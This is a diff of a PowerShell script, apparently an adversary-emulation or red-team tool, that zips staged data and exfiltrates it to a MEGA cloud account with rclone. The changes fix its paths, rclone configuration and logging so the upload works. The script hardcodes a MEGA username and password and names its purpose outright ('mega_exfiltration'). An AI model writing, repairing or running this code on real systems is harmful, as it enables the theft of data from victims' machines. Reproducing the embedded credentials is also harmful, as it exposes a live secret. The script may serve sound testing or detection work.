@@ -9,13 +9,13 @@ Write-Output "==================================================================
 $Slash = "/"; 
 $AntiSlash = "\"; 
 $Column = ":";
-$LogFile = "env:PUBLIC\exf\mega_exfiltration.log";
+$LogFile = "$env:PUBLIC\exf\mega_exfiltration.txt";
 $Username = "dagive1680@emailkeep.com";
 $Password = "qQCxCqrEeXDyPN8zWh3p";
 $Cloud_Storage = "mega"; 
 $ArchiveName = "data.zip";
-$ToolsDir = "env:PUBLIC\toolz\"
-$TransferBinary = $ToolsDir+$AntiSlash+"rclone.exe"
+$ToolsDir = "$env:PUBLIC\toolz\"
+$TransferBinary = $ToolsDir+"rclone.exe"
 $LocalStorageDir = "$env:PUBLIC\exf";
 
 $FullPathArchive = "$LocalStorageDir$AntiSlash$ArchiveName";
@@ -26,25 +26,25 @@ if ([System.IO.File]::Exists("$FullPathArchive"))
     if ([System.IO.File]::Exists("$TransferBinary"))    
         {
         Write-Output "Successfully found [$TransferBinary]" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;
-        New-Item $ToolsDir+$AntiSlash+"rclone" -ItemType directory;
-        New-Item $ToolsDirl+$AntiSlash+"rclone\rclone.conf";
+#        New-Item $ToolsDir+$AntiSlash+"rclone" -ItemType directory;
+#        New-Item $ToolsDirl+$AntiSlash+"rclone\rclone.conf";
         $LaunchDate = `Get-Date -Format "yyyMMdd_HHmmss";
-        $HostName   = `hostname`;
+        $HostName   = $env:COMPUTERNAME;
         $MegaShareDir = $LaunchDate+"_"+$HostName;
         cd $ToolsDir
-        .\rclone.exe config create $MegaShareDir mega
-        set-Content $ToolsDirl+$AntiSlash+"rclone\rclone.conf" "[$MegaShareDir] `n type = mega `n user = $Username `n pass = $Password"
-        .\rclone.exe copyto "$FullPathArchive" $MegaShareDir:files -v
+        .\rclone.exe config create $MegaShareDir mega --config $ToolsDir"rclone.conf"
+        set-Content $ToolsDir"rclone.conf" "[$MegaShareDir] `n type = mega `n user = $Username `n pass = $Password"
+        .\rclone.exe copyto "$FullPathArchive" $MegaShareDir:files -vvvv | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;
         exit 0;
-        };
+        }
     else 
         { 
         "The file $TransferBinary does not exists !!!" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;
         exit 2;
         };
-};
+}
 else 
 { 
-    "The file $FullPathArchive does not exists !!!" | Out-File -FilePath "$LogFile" -Append;
+    "The file $FullPathArchive does not exists !!!" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;
     exit 1;
 };
